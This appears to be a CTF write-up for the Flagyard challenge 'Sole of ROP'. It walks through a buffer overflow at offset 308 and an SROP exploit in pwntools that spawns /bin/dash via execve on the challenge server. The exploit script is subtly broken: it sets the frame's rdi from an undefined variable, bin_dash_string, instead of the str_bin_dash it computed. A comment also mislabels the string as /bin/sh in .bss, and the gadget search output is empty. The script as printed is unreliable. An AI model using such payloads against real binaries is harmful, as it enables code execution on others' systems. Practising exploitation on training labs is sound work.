---
title: "Flagyard - Sole of ROP"
excerpt: " "
comments: true
categories:
  - Hacking
  - Walkthrough
  - CTF
tags:
  - Hacking
  - Walkthrough
  - CTF
  - Flagyard
header:
  overlay_image: /assets/images/pasek-hack.png
---
# Flagyard - Sole of ROP
{: .text-justify}

## 00. Metainfo

|:----|:----|
|Portal:|[Flagyard](https://flagyard.com/)|
|Task:|[Sole of ROP](https://flagyard.com/labs/training-labs/5/challenges/3ef058b5-ab9b-4fda-9413-bc854124ec07)|
|Category:|PWN|

# 01. Description
## Introduction
This challenge, **Sole of ROP**, comes from the Flagyard platform and is a classic example of SROP (Sigreturn Oriented Programming). If you're already familiar with this technique, you should find the task approachable.
{: .text-justify}
Despite the dramatic challenge description:  
> *"Ever tried to solve a Rubik's Cube blindfolded in zero gravity? It's chaotic, disorienting, and utterly thrilling. Swap registers, flip bits, and defy gravity in this cosmic dance of shellcode. May the SIGs be ever in your favor!"*
{: .text-justify}

## Binary Information

### **Checksec Results**
```plaintext
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

### **LDD Results**
```plaintext
ldd ./sole_of_ROP
        not a dynamic executable
```

## Analysis

The challenge boils down to a straightforward SROP problem. Here's a decompiled snippet of the binary’s core functionality (in pseudocode, extracted using Ghidra):
{: .text-justify}
```c
undefined [16] FUN_004000ff(void) {
  long lVar1;
  char *pcVar2;
  char *pcVar3;
  undefined auVar4 [16];
  
  syscall();
  syscall();
  pcVar2 = s_"SOS_SOS_SOS_SOS_00600197;
  pcVar3 = (char *)0x0;
  for (lVar1 = 0x12; lVar1 != 0; lVar1 = lVar1 + -1) {
    *pcVar3 = *pcVar2;
    pcVar2 = pcVar2 + 1;
    pcVar3 = pcVar3 + 1;
  }
  auVar4._8_8_ = pcVar3 + -0x60017c;
  syscall();
  auVar4._0_8_ = 1;
  return auVar4;
}
```

The task is relatively simple. While analyzing, we discovered a buffer overflow vulnerability. By inspecting the stack, it became evident that the overflow happens at offset 308:
{: .text-justify}
```
00:0000│ rsp 0x7fffffffe548 ◂— 0x6161616f62616161 ('aaaboaaa')

pwndbg> cyclic -l aaaboaaa
Finding cyclic pattern of 8 bytes: b'aaaboaaa' (hex: 0x616161626f616161)
Found at offset 308
```

With this information, we confirm the buffer overflow. Given the challenge's title, it strongly hints at SROP. The next step is to search for necessary gadgets.
{: .text-justify}

### Gadget Search

We proceed to search for the required gadgets using `ropper`. The results reveal the critical gadget required for SROP:
{: .text-justify}
```bash
ropper --file=./sole_of_ROP | grep -i pop
[INFO] Load gadgets from cache
[LOAD] loading... 100%
```

From the results, we find the key gadget: `pop rax; ret`. This allows us to set up the syscall environment.

### Exploit Preparation

Using the gadget, we can construct a payload as follows:

1. **Set up RAX with `pop rax`**:
   - Value: `0xf` (for syscall).
2. **Construct the Sigreturn Frame**:
   - Set `rax = 59` for `execve`.
   - Point `rdi` to `/bin/dash` in memory.
   - Set `rsi` and `rdx` to `0x0` (NULL).
   - Set `rip` to the syscall gadget.
3. **Craft the payload**:
   - Buffer overflow up to offset 308.
   - Append the gadgets and the frame.

## Solve in Python
```py
from pwn import *        

context.update(arch='x86_64', os='linux')
context.terminal = ['wt.exe','wsl.exe'] 

HOST="nc 34.252.33.37 32166"
ADDRESS,PORT=HOST.split()[1:]

BINARY_NAME="./sole_of_ROP"
binary = context.binary = ELF(BINARY_NAME, checksec=False)

if args.REMOTE:
    p = remote(ADDRESS,PORT)
else:
    p = process(binary.path)    

length=308

rop=ROP(binary)
syscall=rop.find_gadget(['syscall'])[0]
pop_rax=rop.find_gadget(['pop rax'])[0]
str_bin_dash=next(binary.search(b'/bin/dash'))

frame = SigreturnFrame(kernel="amd64")
frame.rax = 0x3b            # Set rax to 59 for execve
frame.rdi = bin_dash_string # Set rdi to point to /bin/sh in .bss
frame.rsi = 0x0             # Set rsi to NULL (argv)
frame.rdx = 0x0             # Set rdx to NULL (envp)
frame.rip = syscall         # Set rip to the syscall gadget

payload = length * b"\x02"+p64(pop_rax)+p64(0xf)+p64(syscall)+bytes(frame)

p.sendlineafter(b"Sole?", payload)

p.sendline(b'cat flag*')
FLAG=p.recv()
print (FLAG)
p.interactive()
```
## Conclusion

This was a fun and educational challenge, offering a great opportunity to practice SROP techniques. The exploit demonstrates the power of manipulating syscall frames for achieving code execution.
{: .text-justify}

By carefully analyzing the binary and utilizing tools like `pwndbg` and `ropper`, we were able to construct an effective payload that leverages `SIGRETURN` to execute arbitrary code. Challenges like this reinforce the importance of understanding low-level mechanisms in modern exploitation.
{: .text-justify}